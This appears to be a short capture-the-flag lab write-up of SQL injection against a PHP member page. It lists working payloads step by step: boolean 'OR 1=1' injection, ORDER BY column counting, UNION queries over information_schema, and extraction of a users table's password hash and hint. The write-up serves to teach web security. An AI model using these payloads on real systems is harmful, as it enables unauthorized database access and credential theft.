# SQL INJECTION

_/index.php?page=member_

#### Our first injection is:
```
1 OR 1=1
```

#### It display every rows, then we can find how many colums contains the table with ORDER BY
it throw an error the SQL call retrieve 2 columns
```
1 OR 1=1 ORDER BY 3
```

#### We can retreive every table of the db with UNION
```
1 or 1=1 UNION SELECT TABLE_NAME, NULL FROM information_schema.tables
```

#### Then we can find every columns of every tables
```
1 or 1=1 UNION SELECT column_name, table_name FROM information_schema.columns
```

#### List of users table columns
```
user_id
first_name
last_name
town
country
planet
Commentaire
countersign
```

#### We display column Commentaire and countersign
```
1 or 1=1 UNION select countersign, Commentaire FROM users
```

#### And we get the flag !!
```
ID: 1 or 1=1 UNION select countersign, Commentaire FROM users 
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```


